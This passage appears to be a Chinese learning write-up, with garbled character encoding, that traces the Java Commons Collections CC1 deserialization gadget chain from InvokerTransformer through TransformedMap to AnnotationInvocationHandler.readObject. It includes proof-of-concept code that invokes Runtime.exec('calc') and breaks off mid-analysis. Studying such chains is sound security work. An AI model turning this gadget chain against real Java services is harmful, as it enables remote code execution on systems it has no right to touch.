ä¸PHPååºåˆ—åŒ–æ€è·¯ç›¸ä¼¼ æºå¤´ CC1é“¾çš„æºå¤´å°±æ˜¯Commons Collectionsåº“ä¸­çš„Tranformeræ¥å£ï¼Œè¿™ä¸ªæ¥å£é‡Œé¢æœ‰ä¸ªtransformæ–¹æ³•ï¼ˆè¿™é‡Œæˆ‘æ˜¯ç‚¹å‡»äº†å³ä¸Šè§’çš„ä¸‹è½½æºä»£ç æ‰æˆäº†javaæ–‡ä»¶ï¼Œå¦åˆ™ä»ä¸ºclassæ–‡ä»¶ï¼‰ è¿™é‡Œæƒ³è¡¥å……ä¸€ä¸‹ï¼šçœ‹äº†è§†é¢‘å‘ç°å¾€ä¸Šå›æº¯çš„æ€è·¯ä¸€èˆ¬éƒ½æ˜¯æ‰¾ä¸åŒç±»çš„ç›¸åŒæ–¹æ³•ï¼Œå¦‚æœä½ æ‰¾åˆ°çš„æ˜¯ç›¸åŒç±»çš„ç›¸åŒæ–¹æ³•æ˜¯æ²¡æ„ä¹‰çš„ã€‚ æ¯”å¦‚æƒ³æ‰¾setValueæ–¹æ³•ï¼Œç»“æœçœ‹åˆ°ä¸€ä¸ªsetValueè°ƒç”¨setValueæ–¹æ³•ï¼Œé‚£è¿™ä¸è¿˜æ˜¯è¦æ‰¾setValueæ–¹æ³•è¢«è°è°ƒç”¨å—ï¼Œå¦‚æœæ‰¾åˆ°çš„æ˜¯aè°ƒç”¨setValueæ–¹æ³•ï¼Œè¿˜èƒ½ç»§ç»­æ‰¾è°è°ƒç”¨äº†aï¼Œè¿™æ ·æ‰æœ‰æ‰¾å¤´ï¼Œé‡åˆ°å±é™©ç±»çš„å±é™©æ–¹æ³•æ¦‚ç‡ä¹Ÿå°±å¤§ã€‚ ç„¶åå°±æ˜¯å¯»æ‰¾ç»§æ‰¿äº†è¿™ä¸ªæ¥å£çš„ç±» : ctrl+alt+bï¼ˆå‰ææ˜¯é€‰ä¸­transformæ–¹æ³•ï¼‰ å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç±»ï¼Œæˆ‘ä»¬è¿™é‡Œæ‰¾åˆ°äº†æœ‰é‡å†™transformæ–¹æ³•çš„InvokerTransformerç±»ï¼ˆä»¥ä¸Šå±•ç¤ºçš„éƒ½æœ‰é‡å†™transformçš„æƒ…å†µï¼Œä½†invokeè¿™ä¸ªç±»æ›´ç¬¦åˆé¢„æœŸï¼‰ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°å®ƒä¹Ÿç»§æ‰¿äº†Serializableï¼Œå¾ˆç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚ å¯¹äºé›¶åŸºç¡€çš„æˆ‘ï¼Œè¿™é‡Œç†è§£äº†ä¸€ä¸‹ä¸ºä½•è¿™ä¸ªç±»ç»§æ‰¿äº†æˆ‘ä»¬çš„transformæ¥å£ï¼ŒåŸå› åœ¨äºä¸Šå›¾çš„implementså…³é”®å­—ï¼š ç”¨äºè¡¨ç¤ºä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£ã€‚å½“ä¸€ä¸ªç±»ä½¿ç”¨implementså…³é”®å­—åé¢è·Ÿä¸ªå¤šä¸ªæ¥å£åç§°çš„æ—¶å€™ï¼Œä»–å°±è¡¨æ˜è¯¥ç±»æ‰¿è¯ºå®ç°äº†è¿™äº›æ¥å£ä¸­æ‰€å®šä¹‰çš„æ–¹æ³•ï¼Œæ¥ä¸€ä¸ªç®€å•egï¼š public interface MyInterface { void myMethod(); } public class MyClass implements MyInterface { @Override public void myMethod() { // å®ç°æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³• System.out.println(\"MyClass implements MyInterface\"); } } ä¸Šè¿°ä¾‹å­å¯ä»¥çœ‹åˆ°å®šä¹‰äº†ä¸€ä¸ªMyInterfaceç±»æ¥å£ï¼Œé‡Œé¢å®šä¹‰äº†ä¸€ä¸ªæŠ½è±¡æ–¹æ³•myMethodæ–¹æ³•ã€‚æ¥ç€MyClassç»§æ‰¿äº†MyInterfaceç±»ï¼Œå¹¶åœ¨å…¶ä¸­å®ç°äº†æ¥å£ä¸­çš„myMethodæ–¹æ³•ã€‚ InvokerTransformer.transform å®šä½åˆ°InvokerTransformerçš„transformæ–¹æ³• public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass();//è·å–inputå¯¹è±¡çš„classç±»å¯¹è±¡ Method method = cls.getMethod(iMethodName, iParamTypes);//è·å–iMethodNameæ–¹æ³• return method.invoke(input, iArgs);//è°ƒç”¨iMethodNameæ–¹æ³•ï¼Œä¼ å…¥iArgså‚æ•°ï¼Œè¿”å›ç»“æœ } catch (NoSuchMethodException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); } }//ä¸Šé¢å°±æ˜¯å¼‚å¸¸å¯¹åº”çš„å¤„ç†äº† å¯ä»¥çœ‹åˆ°ä¸Šè¿°tryä»£ç å—å°±æ˜¯è°ƒç”¨äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„åå°„æœºåˆ¶ï¼Œæ¥è¿”å›æŸä¸ªæ–¹æ³•çš„å€¼ï¼Œè¿™æ˜¯å¾ˆæ˜æ˜¾çš„åˆ©ç”¨ç‚¹ï¼štransformæ–¹æ³•æ¥å—ä¸€ä¸ªå¯¹è±¡ï¼Œä¸ä¸ºç©ºæ—¶ï¼Œå°±ä¼šè¿›è¡Œé€šè¿‡åå°„æœºåˆ¶åŠ¨æ€åœ°è°ƒç”¨å¯¹è±¡çš„ç‰¹å®šæ–¹æ³•ã€‚ å¹¶ä¸”iMethodName ã€ iParamTypes ã€ iArgs è¿™å‡ ä¸ªå‚æ•°éƒ½æ˜¯é€šè¿‡æ„é€ å‡½æ•°æ§åˆ¶çš„ï¼Œå¹¶ä¸”ä¸ºpublicï¼š //æœ‰å‚æ„é€ å‡½æ•°ã€‚å‚æ•°ä¸ºæ–¹æ³•åï¼Œè°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼Œè°ƒç”¨æ–¹æ³•çš„å‚æ•°å€¼ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } å› ä¸ºè¿™äº›å‚æ•°æˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡InvokerTransformer.transform()æ–¹æ³•æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæ¯”å¦‚å¼¹ä¸€ä¸ªè®¡ç®—å™¨ï¼š å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†æºå¤´åˆ©ç”¨ç‚¹äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä¸€æ­¥æ­¥å›æº¯ï¼Œå¯»æ‰¾åˆé€‚çš„ç±»ï¼Œæ„é€ åˆ©ç”¨é“¾ï¼Œç›´åˆ°åˆ°è¾¾é‡å†™äº†readObjectçš„ç±»ï¼ˆæ²¡æœ‰çš„è¯å°±ä¸è¡Œäº†ï¼‰ å¯»æ‰¾æŸä¸ªç±»ä¸­çš„æŸä¸ªæ–¹æ³•æ˜¯å¦è°ƒç”¨äº†transformæ–¹æ³•ï¼Œç›´æ¥å¯¹è¿™ä¸ªæ–¹æ³•å³é”®æŸ¥æ‰¾ç”¨æ³•ï¼ˆalt+F7ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šç±»éƒ½è°ƒç”¨äº†è¯¥æ–¹æ³• TransformedMap.checkSetValue æˆ‘ä»¬ç›´æ¥æ¥åˆ°TransformedMapç±»ä¸‹çš„checkSetValueæ–¹æ³• æˆ‘ä»¬åŒæ ·æ¥çœ‹ä¸€ä¸‹ TransformedMap è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•å’Œ checkSetValue æ–¹æ³• protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { //æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºMapï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥hashmapã€‚ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªä¸ºTransformeræˆ‘ä»¬éœ€è¦çš„äº†ï¼Œä¸”å¯æ§ super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } ....... protected Object checkSetValue(Object value) {//æ¥å—ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„å‚æ•° return valueTransformer.transform(value);//è¿”å›valueTransformerå¯¹åº”çš„transformæ–¹æ³• } è¿™é‡Œå›æƒ³ä¹‹å‰æˆ‘ä»¬å¼¹è®¡ç®—å™¨ç”¨åˆ°çš„InvokerTransformerå¯¹è±¡ï¼Œåªè¦æƒ³åŠæ³•è®©valueTransformerç­‰äºInvokerTransformeruå³å¯å®ç°å‘½ä»¤æ‰§è¡Œï¼ˆè°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼‰ ä½†è¿™é‡Œçœ‹ä»£ç å‘ç°è¯¥æ„é€ å‡½æ•°ä»¥åŠæ˜¯checkSetValueæ–¹æ³•æ˜¯protectedç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†…éƒ¨ï¼ˆåŒä¸€ä¸ªåŒ…ï¼‰å»å®ä¾‹åŒ–è°ƒç”¨ï¼Œå¤–éƒ¨æ˜¯ä¸èƒ½è®¿é—®çš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æ‰¾å†…éƒ¨å®ä¾‹åŒ–çš„å·¥å…·ï¼Œè¿™é‡Œå¾€ä¸ŠæŸ¥æ‰¾ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªpublicçš„é™æ€æ–¹æ³•decorateæ–¹æ³• TransformedMap.decorate public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } å¾ˆæ˜æ˜¾ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†TransformedMapæ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ï¼Œä¸”æ˜¯publicï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡TransformedMap.decorateæ–¹æ³•æ¥å®ç°è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³• æµ‹è¯•ä»£ç 1 import com.sun.javafx.collections.MappingChange; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.invoke.MethodHandle; import java.lang.reflect.Method; import java.lang.reflect.InvocationTargetException; import javax.swing.text.html.ObjectView; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); //é™æ€æ–¹æ³•staicä¿®é¥°ï¼Œç›´æ¥ç±»åï¼‹æ–¹æ³•åè°ƒç”¨ //æŠŠmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°æˆ‘ä»¬ç”¨ä¸ç€å°±èµ‹ç©ºå€¼null,ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, invokerTransformer); Class transformerMapClass = TransformedMap.class; //TransformedMap.classè¿”å›TransformedMapç±»çš„Classå¯¹è±¡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªClasså¯¹è±¡æ¥è®¿é—®å’Œæ“ä½œTransformedMapç±»çš„ç›¸å…³ä¿¡æ¯ã€‚ Method checkSetValueMethod = transformerMapClass.getDeclaredMethod(\"checkSetValue\", Object.class); //ä½¿ç”¨transformedMapClasså¯¹è±¡æ¥è·å–TransformedMapç±»çš„checkSetValueæ–¹æ³•ã€‚ //å› ä¸ºcheckSetValueæ˜¯peotected,æ‰€ä»¥éœ€è¦ä½¿ç”¨etAccessible(true)æ”¹å˜å…¶ä½œç”¨åŸŸ,è¿™æ ·å³ä½¿ç§æœ‰çš„æ–¹æ³•,ä¹Ÿå¯ä»¥è®¿é—®è°ƒç”¨äº† checkSetValueMethod.setAccessible(true); //å‚æ•°ï¼š1ã€è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡å®ä¾‹ï¼Œ2ã€è¦ä¼ é€’ç»™æ–¹æ³•çš„å‚æ•° checkSetValueMethod.invoke(decorateMap, r); } } è¿™é‡Œå…ˆç†ä¸€ä¸‹æ€è·¯ï¼ˆå…ˆä¸ç®¡Mapï¼ŒHashMapçš„ç”±æ¥ï¼‰é¦–å…ˆæˆ‘ä»¬æ˜¯æ‰¾åˆ°äº†è°ƒç”¨äº†transformæ–¹æ³•çš„ç±»TransformedMapï¼Œæ¥ç€æˆ‘ä»¬è¿›å…¥è¯¥ç±»ç»§ç»­åˆ†æï¼Œå‘ç°checkSetValueæ–¹æ³•çš„valueTransformer.transform(value);è°ƒç”¨ä¸æˆ‘ä»¬æœ€å¼€å§‹çš„demoç›¸åŒï¼Œåªéœ€è¦å°†valueTransformeræ›¿æ¢ä¸ºInvokerTransformerå³å¯ã€‚ é‚£æ—¢ç„¶æˆ‘ä»¬æƒ³è¦è°ƒç”¨checkSetValueæ–¹æ³•ï¼Œå°±éœ€è¦çœ‹è¯¥æ–¹æ³•æ‰€å±ç±»çš„æ„é€ å‡½æ•°äº†ï¼Œæ¥ç€åˆ†æå…¶å¯¹åº”çš„æ„é€ å‡½æ•°å‘ç°å­˜åœ¨å¯¹valueTransformerçš„èµ‹å€¼ï¼Œè¿™æ„å‘³ç€valueTransformeræˆ‘ä»¬å¯æ§äº†ã€‚ä½†è¿™æ—¶å€™å‘ç°éƒ½æ˜¯protectedçš„æƒé™ï¼Œè¿™æ—¶å€™éœ€è¦å¯»æ‰¾å†…éƒ¨æ˜¯å¦å­˜åœ¨å®ä¾‹åŒ–è¯¥ç±»çš„æ–¹æ³•ï¼Œç»“æœå‘ç°decorateé™æ€æ–¹æ³•ï¼Œä¸”ä¸ºpublicæƒé™ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ç›´æ¥è°ƒç”¨å³å¯æ„é€ å®Œæ•´åˆ©ç”¨é“¾ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†decorateæ–¹æ³•ï¼Œè¿™é‡Œæ‰¾åˆ°å¦‚ä¸‹å›¾çš„åœ°æ–¹ï¼Œä½†è¿™ä¸ªç±»æ˜¯æ²¡ç”¨çš„ï¼ˆè¿™é‡Œæ˜¯æ–‡ç« è¯´çš„ï¼Œæˆ‘è¿˜ä¸æ‡‚ï¼Œå…ˆå¾€ä¸‹åˆ†æï¼‰ æ—¢ç„¶æ‰¾ä¸åˆ°åˆé€‚çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠç›®å…‰å†æ”¾å›ä¹‹å‰çš„ checkSetValue æ–¹æ³•ï¼Œå»æ‰¾å“ªé‡Œè°ƒç”¨äº†è¯¥æ–¹æ³•ã€‚ è¿™é‡Œæˆ‘ä»¬åŒæ ·æŸ¥æ‰¾ç”¨æ³•(Alt+F7)ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªåœ°æ–¹è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼š AbstractInputCheckedMapDecorator ç±»çš„ setValue AbstractInputCheckedMapDecorator.MapEntry.setValue ä»”ç»†è§‚å¯Ÿä¹Ÿä¼šå‘ç°ï¼ŒAbstractInputCheckedMapDecoratorç±»ä¸ºTransformedMapçš„çˆ¶ç±» Entryä»£è¡¨çš„æ˜¯Mapä¸­çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè€Œå¯¹Mapä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°setValueæ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨å¯¹Mapè¿›è¡Œéå†çš„æ—¶å€™å¯ä»¥è°ƒç”¨setValueè¿™ä¸ªæ–¹æ³• ä¸è¿‡ä¸Šé¢è¿™ä¸ªMapEntryç±»å®é™…ä¸Šæ˜¯é‡å†™äº†setValueæ–¹æ³•ï¼Œçœ‹ä»–ç»§æ‰¿çš„çˆ¶ç±»AbstractMapEntryDecoratorï¼Œå…¶ä¸­ä¹Ÿå«æœ‰setValueæ–¹æ³• è€Œè¿™ä¸ªç±»åˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸è§„çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValueæ–¹æ³•ï¼Œç„¶åæ°´åˆ°æ¸ æˆçš„è°ƒç”¨checkSetValueæ–¹æ³• import com.sun.javafx.collections.MappingChange; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.invoke.MethodHandle; import java.lang.reflect.Method; import java.lang.reflect.InvocationTargetException; import javax.swing.text.html.ObjectView; import java.util.HashMap; import java.util.Map; public class Cc1 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();//å®ä¾‹åŒ–ä¸€ä¸ªHashMap map.put(\"key\", \"value\");//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿åç»­çš„éå† Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null, invokerTransformer); //ç”¨äºéå† decorateMap ä¸­çš„æ¯ä¸ª Entry å¯¹è±¡ã€‚åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼Œå°†å½“å‰çš„ Entry å¯¹è±¡èµ‹å€¼ç»™å˜é‡entryã€‚æ¯ä¸ª Entry å¯¹è±¡è¡¨ç¤ºä¸€ä¸ªé”®å€¼å¯¹ï¼Œå…¶ä¸­åŒ…æ‹¬é”®å’Œå¯¹åº”çš„å€¼ã€‚ for (Map.Entry entry:decorateMap.entrySet()){//decorateMapæ˜¯ä¸€ä¸ªMapå¯¹è±¡ï¼ŒentrySet() æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ…å« Map ä¸­é”®å€¼å¯¹ï¼ˆEntryï¼‰çš„é›†åˆã€‚ entry.setValue(r);//è°ƒç”¨setvalueæ–¹æ³•ï¼Œè®¾ç½®Entryå¯¹è±¡çš„å€¼ä¸ºr } } } decorateMap ä¹‹å‰çš„ä¸œè¥¿å’Œä¹‹å‰éƒ½ä¸€æ ·ï¼Œä¸å†è®²è¿°ï¼ŒåŒºåˆ«æ˜¯æˆ‘ä»¬è¿™é‡Œéå†äº† decorateMap æ¥è§¦å‘ setValue ã€‚ï¼ˆæ³¨æ„ map.put(â€œkeyâ€,â€œvalueâ€) ï¼Œè¦ä¸ç„¶mapé‡Œé¢æ²¡ä¸œè¥¿ï¼Œåé¢è¿›ä¸å»forå¾ªç¯ï¼‰ decorateMap æ˜¯ TransformedMap ç±»çš„ï¼Œè¯¥ç±»æ²¡æœ‰å†å®ç° entrySet æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨çˆ¶ç±»çš„ entrySet æ–¹æ³•ã€‚æ•…åœ¨forå¾ªç¯æ—¶ä¼šè¿›å…¥å¦‚ä¸‹æ–¹æ³•ï¼š è¿™é‡Œä¼šå…ˆåˆ¤æ–­isSetValueChecking()ï¼Œå¦‚æœåˆ¤æ–­é€šè¿‡å³å¯è¿‡å¾—ä¸€ä¸ªEntrySetå®ä¾‹ï¼Œè€Œæˆ‘ä»¬çš„ isSetValueChecking() æ˜¯æ’è¿”å›trueçš„ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ‰€è°“ï¼Œç›´æ¥è¿”å›å®ä¾‹ã€‚ æ‰€ä»¥æˆ‘ä»¬çš„ entry åœ¨è¿™é‡Œä¹Ÿæ˜¯æ¥è‡ª AbstractInputCheckedMapDecorator ç±»çš„ï¼Œæ‰€ä»¥åé¢æ‰å¯ä»¥è°ƒåˆ° setValue æ–¹æ³•ã€‚æ•ˆæœå¦‚ä¸‹ï¼š protected boolean isSetValueChecking() { return true;//æ’ä¸ºtrue } éš”äº†ä¸€å¤©äº†ï¼Œå†æ¥æ¢³ç†ä¸€ä¸‹ä¸Šè¿°é“¾å­çš„æ€è·¯ï¼š é¦–å…ˆæˆ‘ä»¬åœ¨TransformedMapç±»ä¸‹ï¼Œæƒ³è¦è°ƒç”¨çš„æ˜¯checkSetValueæ–¹æ³•ï¼ˆä½†æ˜¯protectedæƒé™ï¼‰ï¼Œæ¥ç€æˆ‘ä»¬æƒ³çš„æ˜¯ç›´æ¥åˆ©ç”¨è¯¥ç±»æœ¬èº«å¸¦æœ‰çš„decorateæ–¹æ³•æ¥å®ä¾‹åŒ–ç±»ï¼Œè¿›ä¸€æ­¥è°ƒç”¨checkSetValueæ–¹æ³•ï¼Œä½†å¯¹äºdecorateæ¥è®²ï¼Œæ²¡èƒ½æ‰¾åˆ°è°ƒç”¨è¯¥æ–¹æ³•çš„é“¾å­ï¼ˆå‘ç°èµ°ä¸é€šï¼‰ã€‚äºæ˜¯æˆ‘ä»¬æ¥ç€æŸ¥çœ‹checkSetValueæ–¹æ³•è¢«è°è°ƒç”¨è¿‡ã€‚ å‘ç°åªæœ‰ä¸€ä¸ªç±»è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼šAbstractInputCheckedMapDecoratorç±»ä¸‹çš„setValueæ–¹æ³•ï¼Œä»”ç»†è§‚å¯Ÿä¼šå‘ç°è¯¥æ–¹æ³•åŒ…å«åœ¨ä¸€ä¸ªMapEntryç±»ä¸­ï¼Œä¸”ç»§æ‰¿è‡ªçˆ¶ç±»AbstractMapEntryDecoratorï¼Œæˆ‘ä»¬è·Ÿè¸ªè¯¥ç±»ä¼šå‘ç°è¯¥ç±»è¿˜å®ç°äº†Map.Entryæ¥å£ä¸­çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆè§‚å¯Ÿå½“å‰ç±»ï¼Œå‘ç°è¯¥ç±»ä¹Ÿå«æœ‰ä¸€ä¸ªsetValueæ–¹æ³•ï¼Œè¿™æ„å‘³ç€AbstractInputCheckedMapDecoratorç±»ä¸‹çš„setValueæ˜¯å¯¹AbstractMapEntryDecoratorç±»ä¸­å¯¹åº”çš„æ–¹æ³•çš„é‡å†™ã€‚ æ¥ç€æˆ‘ä»¬è·Ÿè¸ªMap.Entryæ¥å£ï¼Œä¼šå‘ç°è¯¥æ¥å£ä¸­å«æœ‰setValueæ–¹æ³•ï¼Œä¸”ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜åœ¨ï¼Œè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬å¯¹Mapå¯¹è±¡è°ƒç”¨entrySetæ–¹æ³•ï¼Œè¿›è¡Œéå†å³å¯å¾—åˆ°setValueæ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•å·²ç»è¢«é‡å†™è¿‡äº†ï¼Œä¹Ÿå°±èƒ½å®Œæ•´çš„å½¢æˆè°ƒç”¨é“¾ è€Œå¯¹äºä¸Šè¿°æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼šå°±æ˜¯æˆ‘ä»¬ç»è¿‡éå†å¾—åˆ°çš„setValueæ–¹æ³•ï¼Œæ˜¯è¢«AbstractMapEntryDecoratorç±»å®ç°çš„ï¼Œä½†æ˜¯è¯¥ç±»çš„å­ç±» AbstractInputCheckedMapDecoratorå¯¹å…¶çˆ¶ç±»çš„setValueæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œé‚£è¿™ä¸ªæ—¶å€™è°ƒç”¨çš„åº”è¯¥æ˜¯çˆ¶ç±»çš„setValueè¿˜æ˜¯å­ç±»çš„setValueæ–¹æ³•å‘¢ï¼Ÿï¼ˆè¿™é‡Œç»™å‡ºGPTçš„ç­”æ¡ˆï¼‰ é€šè¿‡ `entrySet()` æ–¹æ³•è·å–åˆ°çš„ `Map.Entry` å¯¹è±¡ï¼Œè°ƒç”¨çš„æ˜¯å…·ä½“æ¡ç›®å¯¹è±¡çš„ `setValue()` æ–¹æ³•ï¼Œè€Œå…·ä½“æ¡ç›®å¯¹è±¡æ˜¯å®ç°ç±»çš„å®ä¾‹ã€‚ å¦‚æœå…·ä½“æ¡ç›®å¯¹è±¡çš„ `setValue()` æ–¹æ³•åœ¨å­ç±»ä¸­è¢«é‡å†™ï¼ˆè¦†ç›–ï¼‰ï¼Œé‚£ä¹ˆé€šè¿‡ `entrySet()` æ–¹æ³•è·å–åˆ°çš„ `Map.Entry` å¯¹è±¡è°ƒç”¨çš„å°±æ˜¯å­ç±»ä¸­é‡å†™åçš„ `setValue()` æ–¹æ³•ï¼Œè€Œä¸æ˜¯çˆ¶ç±»çš„æ–¹æ³•ã€‚ è¿™ç¬¦åˆé¢å‘å¯¹è±¡çš„å¤šæ€æ€§åŸåˆ™ï¼Œå³é€šè¿‡çˆ¶ç±»çš„å¼•ç”¨è°ƒç”¨å­ç±»çš„æ–¹æ³•æ—¶ï¼Œå®é™…æ‰§è¡Œçš„æ˜¯å­ç±»ä¸­é‡å†™åçš„æ–¹æ³•ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ ä½¿ç”¨çš„æ˜¯ `HashMap` ç±»ä½œä¸º `Map` çš„å®ç°ç±»ï¼Œå¹¶ä¸”åœ¨å­ç±»ä¸­æœ‰ä¸€ä¸ªåä¸º `MyEntry` çš„å…·ä½“æ¡ç›®ç±»ï¼Œè¦†ç›–äº† `setValue()` æ–¹æ³•ï¼Œé‚£ä¹ˆé€šè¿‡ `entrySet()` æ–¹æ³•è·å–åˆ°çš„ `Map.Entry` å¯¹è±¡è°ƒç”¨çš„å°±æ˜¯ `MyEntry` ç±»ä¸­é‡å†™åçš„ `setValue()` æ–¹æ³•ã€‚ æ€»ç»“æ¥è¯´ï¼Œé€šè¿‡ `entrySet()` æ–¹æ³•è·å–åˆ°çš„ `Map.Entry` å¯¹è±¡è°ƒç”¨çš„æ˜¯å…·ä½“æ¡ç›®å¯¹è±¡çš„ `setValue()` æ–¹æ³•ï¼Œå¦‚æœè¯¥æ–¹æ³•åœ¨å­ç±»ä¸­è¢«é‡å†™ï¼Œé‚£ä¹ˆè°ƒç”¨çš„å°±æ˜¯å­ç±»ä¸­é‡å†™åçš„æ–¹æ³•ã€‚ é‚£æˆ‘ä»¬æ¥ç€åˆ†æï¼Œç°å¦‚ä»Šæ‰¾åˆ°äº†setValueæ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»§ç»­çœ‹è°è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥è¢«æˆ‘ä»¬ç»§ç»­æ‰€åˆ©ç”¨æ„é€ å‡ºåˆé€‚çš„é“¾å­ è¿™é‡Œç»è¿‡æ–‡ç« çš„åˆ†æï¼Œæ‰¾åˆ°äº†AnnotationInvocationHandlerç±»ï¼Œä¸”è¯¥ç±»ä¸­è¿˜å«æœ‰readObjectæ–¹æ³• è¿›ä¸€æ­¥è§‚å¯Ÿä»£ç ä¼šå‘ç°ï¼Œå…¶ä¸­çš„forè¯­å¥å·²ç»å®Œç¾çš„æ›¿æ¢æ‰äº†æˆ‘ä»¬ä¸Šè¿°éå†Mapå¯¹è±¡çš„å¤„ç† AnnotationInvocationHandler.readObject è¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°äº† AnnotationInvocationHandler ä¸­çš„ readObject æ–¹æ³•ï¼Œæ¥ä¸‹æ¥è·Ÿç€æ–‡ç« åˆ†æä¸€ä¸‹è¿™æ®µä»£ç  //è¿™æ˜¯ä¸€ä¸ªç§æœ‰æ–¹æ³•ï¼Œç”¨äºååºåˆ—åŒ–å¯¹è±¡ã€‚å®ƒæ¥å—ä¸€ä¸ª ObjectInputStream ç±»å‹çš„å‚æ•° sï¼Œç”¨äºè¯»å–å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ã€‚ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { //ä½¿ç”¨ ObjectInputStream çš„ defaultReadObject() æ–¹æ³•ä»è¾“å…¥æµä¸­è¯»å–å¯¹è±¡çš„é»˜è®¤æ•°æ®ã€‚è¿™æ˜¯ä¸ºäº†ä¿è¯é»˜è®¤çš„ååºåˆ—åŒ–è¡Œä¸ºã€‚ s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly //è¿™æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºæ³¨è§£ç±»å‹ AnnotationType 